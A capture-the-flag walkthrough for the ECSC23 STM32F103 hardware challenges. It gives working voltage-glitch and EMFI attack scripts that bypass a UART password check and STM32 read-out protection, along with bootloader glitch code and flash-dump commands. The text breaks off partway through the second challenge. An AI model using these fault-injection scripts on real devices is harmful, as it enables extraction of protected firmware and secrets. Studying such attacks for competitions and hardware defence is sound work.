# Curious Bolt ECSC23 Challenges Walkthrough
## STM32F103 Target Board - Hardware Security Challenges
### Multi-Tool Edition: Curious Bolt + Bus Pirate + Faulty Cat + Shikra

This guide walks you through solving the 4 hardware security challenges from the European Cyber Security Challenge 2023 (ECSC23), using your full hardware hacking kit.

---

## Table of Contents

1. [Hardware Overview](#hardware-overview)
2. [Tool Selection Guide](#tool-selection)
3. [Software Setup](#software-setup)
4. [Challenge 1: UART Password Bypass](#challenge-1)
5. [Challenge 2: RDP Bypass - Flash Extraction](#challenge-2)
6. [Challenge 3: Side-Channel Attack - Power Analysis](#challenge-3)
7. [Challenge 4: Advanced Glitching - EMFI with Faulty Cat](#challenge-4)
8. [Bonus: Alternative Attack Methods](#bonus)
9. [Troubleshooting](#troubleshooting)
10. [Additional Resources](#resources)

---

## Hardware Overview {#hardware-overview}

### Your Hardware Kit

| Tool | Primary Use | Key Specs |
|------|-------------|-----------|
| **Curious Bolt** | Voltage glitching, power analysis, logic analyzer | 8.3ns glitch precision, 35MSPS scope |
| **Bus Pirate v5/v6** | Protocol analysis (UART, SPI, I2C), initial recon | Multi-protocol, scriptable, pin detection |
| **Faulty Cat v2.1** | Electromagnetic Fault Injection (EMFI) | ~250V pulse, SWD/JTAG pin detection |
| **Shikra** | Fast SPI flash dumping | FT2232H, 3-5min for 4MB |
| **ST-Link v2** | SWD/JTAG debugging, firmware upload/download | Essential for STM32 flash extraction |

### When to Use What

```
┌─────────────────────────────────────────────────────────────────┐
│ TOOL SELECTION FLOWCHART                                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Need to talk UART/SPI/I2C?                                    │
│     └── YES → Bus Pirate (easier setup, great for recon)       │
│                                                                 │
│  Need to dump SPI flash quickly?                               │
│     └── YES → Shikra (10x faster than Bus Pirate)              │
│                                                                 │
│  Need precision voltage glitching?                             │
│     └── YES → Curious Bolt (8.3ns resolution)                  │
│                                                                 │
│  Voltage glitch not working / need non-invasive attack?        │
│     └── YES → Faulty Cat EMFI (no physical connection needed)  │
│                                                                 │
│  Need power analysis / side-channel?                           │
│     └── YES → Curious Bolt (35MSPS differential scope)         │
│                                                                 │
│  Need to find debug pins (SWD/JTAG)?                           │
│     └── YES → Faulty Cat (pin detection, NOT debugging)        │
│            → Bus Pirate (can help identify with logic analyzer)│
│                                                                 │
│  Need to actually USE SWD/JTAG for debugging/download?         │
│     └── YES → ST-Link v2 (REQUIRED for firmware extraction)    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Target Board Layout

```
┌─────────────────────────────────────────┐
│  STM32F103 ECSC23 Target Board          │
│                                         │
│  [VMCU] - MCU core voltage (glitching)  │
│  [VCC]  - 3.3V input                    │
│  [GND]  - Ground reference              │
│  [TX]   - UART transmit                 │
│  [RX]   - UART receive                  │
│  [RST]  - Reset line                    │
│  [BOOT0]- Boot mode selection           │
│  [SWDIO]- SWD data                      │
│  [SWCLK]- SWD clock                     │
│  [SPI]  - If external flash present     │
│                                         │
│         ┌──────────┐                    │
│         │ STM32F103│                    │
│         │   ~~~~   │ ← EMFI target area │
│         └──────────┘                    │
└─────────────────────────────────────────┘
```

---

## Tool Selection Guide {#tool-selection}

### Challenge → Tool Mapping

| Challenge | Primary Tool | Secondary Tool | Why |
|-----------|--------------|----------------|-----|
| **Challenge 1** (UART bypass) | Bus Pirate | Curious Bolt | BP for UART, Bolt for glitch |
| **Challenge 2** (RDP bypass) | Curious Bolt + ST-Link | Faulty Cat | Glitch with Bolt/FC, extract with ST-Link |
| **Challenge 3** (Power analysis) | Curious Bolt | Bus Pirate | Bolt scope + BP for comms |
| **Challenge 4** (Advanced) | Faulty Cat + ST-Link | Curious Bolt | EMFI attack, ST-Link to verify/extract |
| **Flash dump** (MCU internal) | ST-Link | - | REQUIRED for STM32 flash extraction |
| **Flash dump** (external SPI) | Shikra | Bus Pirate | Speed vs. convenience |

---

## Software Setup {#software-setup}

### 1. Curious Bolt Setup

```bash
# Clone and install Bolt library
git clone https://github.com/tjclement/bolt.git
cd bolt
pip install -e .

# Test connection
python3 -c "from scope import Scope; s = Scope(); print('Bolt OK')"
```

### 2. Bus Pirate Setup

```bash
# Install pyBusPirateLite
pip install pyBusPirateLite

# Or use the Bus Pirate's built-in terminal
# Connect via serial at 115200 baud
tio -b 115200 /dev/ttyACM0

# Bus Pirate v5/v6 commands:
# m - mode select
# (1) UART
# (2) SPI
# (3) I2C
```

**Bus Pirate UART Bridge Mode:**
```
# In Bus Pirate terminal:
m      # Mode select
1      # UART
3      # 115200 baud (adjust as needed)
1      # 8N1
1      # Idle 1
2      # Normal output
(1)    # Macro: transparent UART bridge
```

### 3. Faulty Cat Setup

```bash
# Install Arduino IDE (for uploading/configuring)
# macOS
brew install --cask arduino-ide

# Linux
sudo apt install arduino

# Add Electronic Cats board support
# File → Preferences → Additional Board URLs:
# https://electroniccats.github.io/arduino-boards-index/package_electroniccats_index.json

# Select: Tools → Board → Electronic Cats → Faulty Cat
```

**Faulty Cat Python Control:**
```python
#!/usr/bin/env python3
# faulty_cat_control.py

import serial
import time

class FaultyCat:
    def __init__(self, port='/dev/ttyACM1'):
        self.ser = serial.Serial(port, 115200, timeout=1)
        time.sleep(2)  # Wait for Arduino reset
    
    def pulse(self, count=1):
        """Fire EMFI pulse(s)"""
        for _ in range(count):
            self.ser.write(b'P')  # Pulse command
            time.sleep(0.2)       # Recovery time
    
    def arm(self):
        """Arm for external trigger"""
        self.ser.write(b'A')
    
    def detect_swd(self):
        """Run SWD/JTAG pin detection"""
        self.ser.write(b'D')
        return self.ser.read(1000).decode()
    
    def close(self):
        self.ser.close()
```

### 4. Shikra Setup

```bash
# Install flashrom with FTDI support
# macOS
brew install flashrom libftdi

# Linux
sudo apt install flashrom libftdi1-dev

# Test Shikra connection
flashrom -p ft2232_spi:type=232H
```

### 5. Additional Tools

```bash
# ST-Link tools (REQUIRED for firmware extraction)
brew install stlink  # macOS
sudo apt install stlink-tools  # Linux

# OpenOCD for advanced debugging
brew install openocd  # macOS
sudo apt install openocd  # Linux

# PulseView for logic analysis
brew install --cask pulseview  # macOS
sudo apt install pulseview sigrok  # Linux

# Serial terminals
brew install tio minicom  # macOS
sudo apt install tio minicom picocom  # Linux
```

### 6. Linux USB Permissions (All Devices)

```bash
# Create comprehensive udev rules
cat << 'EOF' | sudo tee /etc/udev/rules.d/99-hardware-hacking.rules
# Curious Bolt
SUBSYSTEM=="usb", ATTR{idVendor}=="2e8a", MODE="0666", GROUP="plugdev"

# Bus Pirate
SUBSYSTEM=="usb", ATTR{idVendor}=="0403", ATTR{idProduct}=="6001", MODE="0666"
SUBSYSTEM=="usb", ATTR{idVendor}=="04d8", MODE="0666"

# Shikra / FTDI
SUBSYSTEM=="usb", ATTR{idVendor}=="0403", ATTR{idProduct}=="6010", MODE="0666"
SUBSYSTEM=="usb", ATTR{idVendor}=="0403", ATTR{idProduct}=="6014", MODE="0666"

# Faulty Cat (Arduino-based)
SUBSYSTEM=="usb", ATTR{idVendor}=="2341", MODE="0666"
SUBSYSTEM=="usb", ATTR{idVendor}=="1b4f", MODE="0666"

# ST-Link v2
SUBSYSTEM=="usb", ATTR{idVendor}=="0483", ATTR{idProduct}=="3748", MODE="0666"

# ST-Link v2-1 (on Nucleo boards)
SUBSYSTEM=="usb", ATTR{idVendor}=="0483", ATTR{idProduct}=="374b", MODE="0666"

# ST-Link v3
SUBSYSTEM=="usb", ATTR{idVendor}=="0483", ATTR{idProduct}=="374d", MODE="0666"
SUBSYSTEM=="usb", ATTR{idVendor}=="0483", ATTR{idProduct}=="374e", MODE="0666"
SUBSYSTEM=="usb", ATTR{idVendor}=="0483", ATTR{idProduct}=="374f", MODE="0666"
EOF

sudo udevadm control --reload-rules
sudo udevadm trigger
sudo usermod -a -G plugdev,dialout $USER
```

---

## Challenge 1: UART Password Bypass via Glitching {#challenge-1}

### Objective
Bypass the password check on the UART console to get the flag.

### Tools Used
- **Bus Pirate**: UART communication and initial reconnaissance
- **Curious Bolt**: Voltage glitching to bypass password check
- **Alternative**: Faulty Cat EMFI if voltage glitch is difficult

---

### Phase 1: Reconnaissance with Bus Pirate

The Bus Pirate is perfect for initial UART exploration - it's easier to set up than writing Python scripts.

#### Wiring (Bus Pirate to Target)

```
Bus Pirate       Target
─────────        ──────
GND       ────── GND
MOSI(TX)  ────── RX
MISO(RX)  ────── TX
```

#### Find the Baud Rate

```bash
# Connect to Bus Pirate
tio -b 115200 /dev/ttyACM0

# In Bus Pirate terminal:
m        # Mode
1        # UART

# Try common baud rates:
# 9600, 19200, 38400, 57600, 115200, 230400, 460800, 921600

# Start with 115200 (most common for STM32)
3        # 115200
1        # 8N1
1        # Idle high
2        # Normal output

# Enter bridge mode to talk directly to target
(1)      # Transparent bridge macro

# Now type and see if you get readable responses
# Press ~ to exit bridge mode
```

#### Explore the Interface

Once you find the right baud rate, explore:

```
=== ECSC23 Challenge 1 ===
Enter password: test
Access denied.

Enter password: admin
Access denied.

Enter password: 
```

**What we learned:**
- Interface prompts for password
- Returns "Access denied" for wrong passwords
- There's a delay between input and response (our glitch window!)

#### Measure Timing with Bus Pirate's LA Mode

Bus Pirate v5/v6 has logic analyzer capability:

```bash
# Use Bus Pirate's logic analyzer to measure response timing
# This helps identify the glitch window
```

---

### Phase 2: Attack with Curious Bolt

Now we set up the glitch attack using the Bolt.

#### Wiring (Complete Setup)

```
┌─────────────────────────────────────────────────────────────┐
│ Challenge 1 Wiring Diagram                                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Bus Pirate          Target          Curious Bolt           │
│  ──────────          ──────          ────────────           │
│  GND          ─┬──── GND ─────┬───── GND                   │
│  MOSI(TX)     ─┼──── RX       │                            │
│  MISO(RX)     ─┼──── TX ──────┼───── CH0 (trigger)         │
│               │      VMCU ────┼───── SIG (glitch)          │
│               │      RST ─────┼───── IO0 (optional reset)  │
│               └──────────────┘                             │
│                                                             │
│  Alternative: Use USB-UART adapter instead of Bus Pirate   │
│  for UART, keep Bus Pirate free for other probing          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Python Attack Script

```python
#!/usr/bin/env python3
# ch1_uart_glitch_attack.py
"""
Challenge 1: UART Password Bypass via Voltage Glitching
Uses: Curious Bolt (glitcher) + Serial UART

The password check in firmware likely looks like:
    if (strcmp(input, password) == 0) {
        print_flag();
    } else {
        print("Access denied");
    }

We glitch during strcmp or the branch to bypass.
"""

import serial
import time
import sys
from scope import Scope

class Challenge1Attack:
    def __init__(self, uart_port='/dev/ttyUSB0', uart_baud=115200):
        self.bolt = Scope()
        self.uart = serial.Serial(uart_port, uart_baud, timeout=2)
        print(f"[*] Bolt connected, UART on {uart_port}")
    
    def cleanup(self):
        self.uart.close()
    
    def try_glitch(self, offset, width, password=b'wrong'):
        """
        Attempt password bypass with glitch
        
        offset: delay after trigger (8.3ns units)
        width: glitch duration (8.3ns units)
        """
        # Configure glitch
        self.bolt.glitch.repeat = width
        self.bolt.glitch.ext_offset = offset
        
        # Clear buffers
        self.uart.reset_input_buffer()
        self.uart.reset_output_buffer()
        
        # Wait for prompt
        time.sleep(0.1)
        self.uart.read(1000)  # Clear any pending data
        
        # Arm glitch on TX line activity (target responding)
        # We want to glitch when target starts processing
        self.bolt.arm(0, Scope.FALLING_EDGE)
        
        # Send password
        self.uart.write(password + b'\r\n')
        self.uart.flush()
        
        # Wait for response
        time.sleep(0.3)
        response = self.uart.read(500).decode('utf-8', errors='ignore')
        
        return response
    
    def attack(self, offset_range=(1000, 50000), width_range=(30, 150)):
        """
        Search for successful glitch parameters
        """
        offset_min, offset_max = offset_range
        width_min, width_max = width_range
        
        attempts = 0
        
        print(f"[*] Starting glitch search...")
        print(f"    Offset: {offset_min}-{offset_max} (8.3ns units)")
        print(f"    Width: {width_min}-{width_max} (8.3ns units)")
        
        for offset in range(offset_min, offset_max, 500):
            for width in range(width_min, width_max, 10):
                attempts += 1
                
                response = self.try_glitch(offset, width)
                
                # Check for success
                if 'flag' in response.lower() or 'ECSC' in response:
                    print(f"\n{'='*60}")
                    print(f"[SUCCESS!] Flag found!")
                    print(f"Parameters: offset={offset}, width={width}")
                    print(f"Response:\n{response}")
                    print(f"{'='*60}")
                    return True, (offset, width)
                
                # Check for interesting (non-standard) responses
                if 'denied' not in response.lower() and len(response) > 5:
                    print(f"[?] Interesting @ offset={offset}, width={width}")
                    print(f"    Response: {response[:100]}")
                
                # Progress indicator
                if attempts % 100 == 0:
                    print(f"[*] Progress: {attempts} attempts...")
        
        print(f"[!] Search complete. {attempts} attempts, no flag found.")
        return False, None
    
    def fine_tune(self, base_offset, base_width, radius=50):
        """
        Fine-tune around known-good parameters
        """
        print(f"[*] Fine-tuning around offset={base_offset}, width={base_width}")
        
        for offset in range(base_offset - radius*10, base_offset + radius*10, 10):
            for width in range(base_width - radius, base_width + radius, 2):
                response = self.try_glitch(offset, width)
                
                if 'flag' in response.lower() or 'ECSC' in response:
                    print(f"[SUCCESS!] offset={offset}, width={width}")
                    print(response)
                    return True
        
        return False


def main():
    # Adjust port as needed
    attack = Challenge1Attack(uart_port='/dev/ttyUSB0')
    
    try:
        # Phase 1: Wide search
        success, params = attack.attack(
            offset_range=(5000, 40000),  # ~40µs to ~330µs
            width_range=(40, 120)         # ~330ns to ~1µs
        )
        
        if success and params:
            # Phase 2: Fine-tune for reliability
            attack.fine_tune(params[0], params[1])
    
    finally:
        attack.cleanup()


if __name__ == '__main__':
    main()
```

---

### Phase 3: Alternative - EMFI Attack with Faulty Cat

If voltage glitching doesn't work (maybe there's good power filtering), try EMFI!

#### Wiring (Faulty Cat)

```
┌─────────────────────────────────────────────────────────────┐
│ EMFI Attack Setup                                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Bus Pirate          Target          Faulty Cat             │
│  ──────────          ──────          ──────────             │
│  GND          ────── GND ──────────  GND                   │
│  MOSI(TX)     ────── RX                                    │
│  MISO(RX)     ────── TX  ──────────  TRIG (trigger input)  │
│                                                             │
│              [EMFI Coil positioned over STM32 chip]         │
│                                                             │
│  Position the EMFI probe ~1-3mm above the MCU              │
│  Move it around to find the sweet spot                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### EMFI Attack Script

```python
#!/usr/bin/env python3
# ch1_emfi_attack.py
"""
Challenge 1: UART Password Bypass via EMFI (Faulty Cat)
Non-invasive attack - no physical connection to power rails needed!
"""

import serial
import time

class FaultyCat:
    def __init__(self, port='/dev/ttyACM1'):
        self.ser = serial.Serial(port, 115200, timeout=1)
        time.sleep(2)
        print(f"[*] Faulty Cat connected on {port}")
    
    def pulse(self):
        """Fire single EMFI pulse (~250V, 0.2W)"""
        self.ser.write(b'P')
        time.sleep(0.2)  # Recovery time between pulses
    
    def arm_trigger(self):
        """Arm for external trigger"""
        self.ser.write(b'A')
    
    def close(self):
        self.ser.close()


class Challenge1EMFI:
    def __init__(self, uart_port='/dev/ttyUSB0', fc_port='/dev/ttyACM1'):
        self.uart = serial.Serial(uart_port, 115200, timeout=2)
        self.fc = FaultyCat(fc_port)
    
    def try_emfi_attack(self, delay_ms=10):
        """
        Send password, wait delay_ms, fire EMFI pulse
        """
        self.uart.reset_input_buffer()
        
        # Send wrong password
        self.uart.write(b'wrong_password\r\n')
        
        # Wait for processing to start
        time.sleep(delay_ms / 1000.0)
        
        # Fire EMFI pulse!
        self.fc.pulse()
        
        # Read response
        time.sleep(0.3)
        response = self.uart.read(500).decode('utf-8', errors='ignore')
        
        return response
    
    def search_timing(self):
        """
        Search for correct EMFI timing
        EMFI is less precise than voltage glitch, so we use ms delays
        """
        print("[*] Starting EMFI timing search...")
        print("[!] Make sure EMFI coil is positioned over STM32!")
        
        for delay_ms in range(1, 100, 2):
            response = self.try_emfi_attack(delay_ms)
            
            if 'flag' in response.lower() or 'ECSC' in response:
                print(f"\n[SUCCESS!] Delay: {delay_ms}ms")
                print(response)
                return True
            
            if 'denied' not in response.lower() and len(response) > 5:
                print(f"[?] Interesting @ {delay_ms}ms: {response[:50]}")
        
        return False
    
    def position_search(self, delay_ms=20):
        """
        Interactive mode to find best coil position
        """
        print("[*] Position search mode")
        print("[*] Move the EMFI coil around while attacks run")
        print("[*] Press Ctrl+C to stop")
        
        try:
            while True:
                response = self.try_emfi_attack(delay_ms)
                
                if 'flag' in response.lower():
                    print(f"\n[SUCCESS!] Found flag!")
                    print(response)
                    return
                
                if 'denied' not in response.lower():
                    print(f"[!] Got unusual response - try this position more!")
                
                time.sleep(0.5)
        
        except KeyboardInterrupt:
            print("\n[*] Stopped")
    
    def cleanup(self):
        self.uart.close()
        self.fc.close()


def main():
    attack = Challenge1EMFI()
    
    try:
        # First, find timing with coil in one position
        # attack.search_timing()
        
        # Or, interactive position finding
        attack.position_search(delay_ms=15)
    
    finally:
        attack.cleanup()


if __name__ == '__main__':
    main()
```

#### EMFI Tips

1. **Coil Position**: Start directly over the STM32 chip, ~1-3mm height
2. **Sweet Spot**: The CPU core area is usually most sensitive
3. **Move Slowly**: Small position changes make big differences
4. **Multiple Pulses**: Sometimes you need 2-3 pulses in quick succession
5. **Safety**: EMFI can damage the target - start with lower power if possible

---

## Challenge 2: RDP Bypass - Flash Memory Extraction {#challenge-2}

### Objective
Bypass STM32F103 Read-Out Protection to extract flash memory containing the flag.

### Tools Used
- **Curious Bolt**: Precision voltage glitching during RDP check
- **ST-Link v2**: **REQUIRED** - Only tool that can actually download firmware via SWD
- **Faulty Cat**: Alternative EMFI approach / SWD pin detection (detection only, not debugging)
- **Bus Pirate**: Bootloader communication (UART)

---

### Understanding STM32F103 RDP

```
┌─────────────────────────────────────────────────────────────┐
│ STM32F103 Read-Out Protection (RDP)                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│ Option Byte 0x1FFFF800 controls RDP:                        │
│   0xA5 = Level 0 (No protection) - Full debug access        │
│   Other = Level 1 (Protected) - Debug locked, flash hidden  │
│                                                             │
│ Attack Vectors:                                             │
│                                                             │
│ 1. Boot-time glitch:                                        │
│    - Glitch during RDP byte read at power-on                │
│    - Causes wrong value to be read → protection disabled    │
│    - Window: ~5-50µs after reset release                    │
│                                                             │
│ 2. Bootloader command glitch:                               │
│    - Enter bootloader mode (BOOT0=1)                        │
│    - Send Read Memory command (0x11)                        │
│    - Glitch during RDP check in command handler             │
│    - Window: ~15-20ms after command                         │
│                                                             │
│ 3. EMFI during either of above                              │
│    - Same timing, but electromagnetic pulse instead         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

### Phase 1: Verify RDP Status & Find Debug Pins

#### Use Faulty Cat for SWD Detection

If you're not sure where SWD pins are:

```python
#!/usr/bin/env python3
# ch2_find_swd.py
"""
Use Faulty Cat's JTAGulator-like feature to find SWD pins
"""

import serial
import time

fc = serial.Serial('/dev/ttyACM1', 115200, timeout=5)
time.sleep(2)

# Send detect command
fc.write(b'D')  # Detect SWD/JTAG

# Read results
time.sleep(3)
result = fc.read(2000).decode()
print("SWD/JTAG Detection Results:")
print(result)

fc.close()
```

#### Verify RDP with ST-Link

**IMPORTANT:** You need an ST-Link v2 debugger for this. Bus Pirate, Curious Bolt, and Faulty Cat cannot access SWD/JTAG for firmware extraction.

```bash
# Method 1: Using st-flash directly
st-info --probe
# If RDP is enabled, this will show limited info or fail

st-flash read test_dump.bin 0x08000000 0x100
# If protected, will fail or read all 0xFF/0x00

# Method 2: Using OpenOCD with ST-Link
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg \
    -c "init" \
    -c "flash info 0" \
    -c "shutdown"

# Expected output if protected:
# "Device is read protected"
# or "Cannot read flash"
```

---

### Phase 2: Boot-Time Voltage Glitch Attack (Curious Bolt)

#### Wiring

```
┌─────────────────────────────────────────────────────────────┐
│ RDP Bypass Wiring                                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Curious Bolt          Target          ST-Link v2           │
│  ────────────          ──────          ──────────           │
│  GND           ─────── GND ──────────  GND                 │
│  SIG (glitch)  ─────── VMCU                                │
│  IO0           ─────── RST                                 │
│                        SWDIO ─────────  SWDIO              │
│                        SWCLK ─────────  SWCLK              │
│                        3.3V  ─────────  3.3V (optional)    │
│                                                             │
│  Purpose:                                                   │
│    Curious Bolt: Glitches the RDP check                    │
│    ST-Link v2:   Reads flash once protection is bypassed   │
│                                                             │
│  Note: Remove/lift any decoupling capacitors near VMCU     │
│  for better glitch effectiveness                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Attack Script

```python
#!/usr/bin/env python3
# ch2_rdp_bypass_boot.py
"""
Challenge 2: RDP Bypass via Boot-Time Voltage Glitch
Glitch during RDP option byte read at power-on
"""

import subprocess
import time
import os
from scope import Scope

class RDPBypassAttack:
    def __init__(self):
        self.bolt = Scope()
        print("[*] Bolt connected")
    
    def reset_target(self):
        """Pull RST low then release"""
        self.bolt.io.set(0, False)  # RST low
        time.sleep(0.05)
        self.bolt.io.set(0, True)   # RST high (release)
    
    def glitched_reset(self, offset, width):
        """
        Reset with precisely timed glitch
        
        offset: delay after reset release (8.3ns units)
        width: glitch duration (8.3ns units)
        """
        self.bolt.glitch.repeat = width
        self.bolt.glitch.ext_offset = offset
        
        # Hold reset
        self.bolt.io.set(0, False)
        time.sleep(0.05)
        
        # Arm glitch to fire on reset release
        self.bolt.arm(0, Scope.RISING_EDGE)
        
        # Release reset - glitch fires after offset
        self.bolt.io.set(0, True)
        
        # Wait for glitch and boot
        time.sleep(0.02)
    
    def try_stlink_read(self, output_file='flash_dump.bin'):
        """
        Attempt to read flash via ST-Link (st-flash command)
        Returns True if successful

        Note: This requires ST-Link v2 hardware connected via SWD
        """
        # Method 1: Try st-flash directly (faster)
        cmd = [
            'st-flash',
            'read',
            output_file,
            '0x08000000',
            '0x10000'  # 64KB
        ]

        # Alternatively, use OpenOCD if preferred:
        # cmd = [
        #     'openocd',
        #     '-f', 'interface/stlink.cfg',
        #     '-f', 'target/stm32f1x.cfg',
        #     '-c', 'init',
        #     '-c', f'flash read_bank 0 {output_file}',
        #     '-c', 'shutdown'
        # ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=5,
                text=True
            )
            
            # Check if read was successful
            if os.path.exists(output_file) and os.path.getsize(output_file) > 1000:
                # Verify it's not all 0xFF (empty/protected)
                with open(output_file, 'rb') as f:
                    data = f.read(256)
                    if data != b'\xff' * 256:
                        return True
            
            return False
            
        except subprocess.TimeoutExpired:
            return False
        except Exception as e:
            return False
    
    def attack(self):
        """
        Main attack loop
        RDP check happens early in boot: ~5-50µs after reset
        """
        print("[*] Starting RDP bypass attack...")
        print("[*] Offset range: 600-6000 units (~5-50µs)")
        print("[*] Width range: 20-200 units (~170ns-1.7µs)")
        
        attempts = 0
        
        for offset in range(600, 6000, 50):
            for width in range(30, 200, 20):
                attempts += 1
                
                # Perform glitched reset
                self.glitched_reset(offset, width)
                
                # Try to read flash using ST-Link
                if self.try_stlink_read():
                    print(f"\n{'='*60}")
                    print(f"[SUCCESS!] RDP BYPASSED!")
                    print(f"Parameters: offset={offset}, width={width}")
                    print(f"Flash dumped to flash_dump.bin")
                    print(f"{'='*60}")
                    
                    # Search for flag
                    self.find_flag('flash_dump.bin')
                    return True
                
                if attempts % 50 == 0:
                    print(f"[*] Progress: {attempts} attempts (offset={offset})")
        
        print(f"[!] Attack complete. {attempts} attempts, no bypass.")
        return False
    
    def find_flag(self, dump_file):
        """Search dump for flag"""
        with open(dump_file, 'rb') as f:
            data = f.read()
        
        # Look for common flag patterns
        patterns = [b'ECSC', b'flag{', b'FLAG', b'CTF{']
        
        for pattern in patterns:
            if pattern in data:
                idx = data.find(pattern)
                # Extract surrounding context
                start = max(0, idx - 10)
                end = min(len(data), idx + 100)
                print(f"\n[FLAG] Found at offset 0x{idx:x}:")
                print(data[start:end])


def main():
    attack = RDPBypassAttack()
    attack.attack()


if __name__ == '__main__':
    main()
```

---

### Phase 3: Bootloader Glitch Attack (Alternative Method)

If boot-time glitch is difficult, try glitching the bootloader.

#### Enter Bootloader Mode

```bash
# Set BOOT0=1 (connect BOOT0 pin to VCC)
# Then reset the target
# Now STM32 is in system bootloader mode
```

#### Wiring for Bootloader Attack

```
┌─────────────────────────────────────────────────────────────┐
│ Bootloader Glitch Wiring                                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Bus Pirate          Target          Curious Bolt           │
│  ──────────          ──────          ────────────           │
│  GND          ─────── GND ─────────── GND                  │
│  MOSI(TX)     ─────── RX                                   │
│  MISO(RX)     ─────── TX ──────────── CH0 (trigger)        │
│                       VMCU ─────────── SIG (glitch)        │
│                       BOOT0 ────────── VCC (3.3V)          │
│                                                             │
│  Note: STM32 bootloader uses EVEN PARITY (8E1)             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Bootloader Glitch Script

```python
#!/usr/bin/env python3
# ch2_bootloader_glitch.py
"""
Challenge 2: RDP Bypass via Bootloader Command Glitch
Glitch during Read Memory (0x11) command's RDP check
"""

import serial
import time
from scope import Scope

class BootloaderGlitch:
    """
    STM32 Bootloader Commands (AN3155):
    0x00 - Get
    0x01 - Get Version  
    0x02 - Get ID
    0x11 - Read Memory ← Target (blocked by RDP)
    0x21 - Go
    0x31 - Write Memory
    """
    
    def __init__(self, uart_port='/dev/ttyUSB0'):
        self.bolt = Scope()
        # STM32 bootloader uses EVEN PARITY
        self.uart = serial.Serial(
            uart_port, 
            115200, 
            timeout=1,
            parity=serial.PARITY_EVEN
        )
        print("[*] Connected to Bolt and UART")
    
    def sync_bootloader(self):
        """Synchronize with bootloader"""
        self.uart.write(b'\x7F')
        time.sleep(0.1)
        response = self.uart.read(1)
        return response == b'\x79'  # ACK
    
    def send_command(self, cmd):
        """Send command with checksum"""
        checksum = (~cmd) & 0xFF
        self.uart.write(bytes([cmd, checksum]))
        time.sleep(0.01)
        return self.uart.read(1)
    
    def try_read_memory(self, address, length, offset, width):
        """
        Attempt Read Memory with glitch during RDP check
        """
        self.bolt.glitch.repeat = width
        self.bolt.glitch.ext_offset = offset
        
        # Sync
        if not self.sync_bootloader():
            return None
        
        # Arm glitch
        self.bolt.arm(0, Scope.FALLING_EDGE)
        
        # Send Read Memory command (0x11)
        ack = self.send_command(0x11)
        
        if ack != b'\x79':
            return None  # Command rejected (RDP active)
        
        # Glitch may have worked! Continue with address
        addr_bytes = address.to_bytes(4, 'big')
        checksum = 0
        for b in addr_bytes:
            checksum ^= b
        
        self.uart.write(addr_bytes + bytes([checksum]))
        ack = self.uart.read(1)
        
        if ack != b'\x79':
            return None
        
        # Send length (N-1 format)
        n = length - 1
        self.uart.write(bytes([n, (~n) & 0xFF]))
        ack = self.uart.read(1)
        
        if ack != b'\x79':
            return None
        
        # Read data!
        data = self.uart.read(length)
        return data
    
    def attack(self, target_address=0x08000000):
        """
        Glitch attack on Read Memory command
        """
        print("[*] Starting bootloader glitch attack...")
        print(f"[*] Target address: 0x{target_address:08x}")
        
        # Timing is ~15-20ms after command for RDP check
        # That's ~1.8M-2.4M units (too big for ext_offset)
        # We use a different approach: glitch as command is sent
        
        for offset in range(15000, 25000, 200):
            for width in range(40, 160, 20):
                
                data = self.try_read_memory(
                    target_address, 
                    256,  # Read 256 bytes at a time
                    offset, 
                    width
                )
                
                if data and len(data) == 256:
                    # Check it's not all 0xFF
                    if data != b'\xff' * 256:
                        print(f"\n[SUCCESS!] Read memory at offset={offset}, width={width}")
                        print(f"Data (first 64 bytes):")
                        print(data[:64].hex())
                        
                        # Dump full flash
                        self.dump_flash()
                        return True
        
        return False
    
    def dump_flash(self, output_file='bootloader_dump.bin'):
        """Dump entire flash using successful parameters"""
        # Use the parameters that worked
        # Read in 256-byte chunks
        flash_size = 64 * 1024  # 64KB for STM32F103C8
        
        with open(output_file, 'wb') as f:
            for addr in range(0x08000000, 0x08000000 + flash_size, 256):
                data = self.try_read_memory(addr, 256, self.good_offset, self.good_width)
                if data:
                    f.write(data)
                    print(f"[*] Dumped 0x{addr:08x}")
                else:
                    f.write(b'\xff' * 256)  # Fill gaps
        
        print(f"[*] Flash dumped to {output_file}")


def main():
    attack = BootloaderGlitch()
    attack.attack()


if __name__ == '__main__':
    main()
```

---

### Phase 4: Flash Extraction After Successful Glitch

**IMPORTANT:** Once you've successfully glitched the RDP protection, you need ST-Link to extract the firmware.

#### Method 1: ST-Link Direct Read (Fastest)

```bash
# Read entire flash
st-flash read firmware_dump.bin 0x08000000 0x10000

# Verify it's not empty
hexdump -C firmware_dump.bin | head -20

# If you see actual code (not all 0xFF), success!
```

#### Method 2: OpenOCD with ST-Link

```bash
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg \
    -c "init" \
    -c "reset halt" \
    -c "flash read_bank 0 firmware_dump.bin" \
    -c "shutdown"
```

#### Method 3: External SPI Flash (If Present)

**Note:** This only works if the target has a separate external SPI flash chip. The STM32's internal flash can ONLY be read via SWD using ST-Link.

```bash
# If there's an external W25Q or MX25 flash chip on the board:

# Wiring:
# Shikra MOSI → Flash SI
# Shikra MISO → Flash SO
# Shikra CLK  → Flash CLK
# Shikra CS   → Flash CS#
# Shikra GND  → GND

# Dump with flashrom
flashrom -p ft2232_spi:type=232H -r external_flash.bin

# Analyze
binwalk -Me external_flash.bin
strings external_flash.bin | grep -i flag
```

---

### Phase 5: EMFI Alternative with Faulty Cat

```python
#!/usr/bin/env python3
# ch2_rdp_emfi.py
"""
Challenge 2: RDP Bypass via EMFI
Position EMFI coil over STM32 and pulse during boot
"""

import serial
import subprocess
import time

class RDPEMFI:
    def __init__(self, fc_port='/dev/ttyACM1'):
        self.fc = serial.Serial(fc_port, 115200, timeout=1)
        time.sleep(2)
    
    def emfi_reset_attack(self, delay_us):
        """
        Reset target and fire EMFI after delay
        """
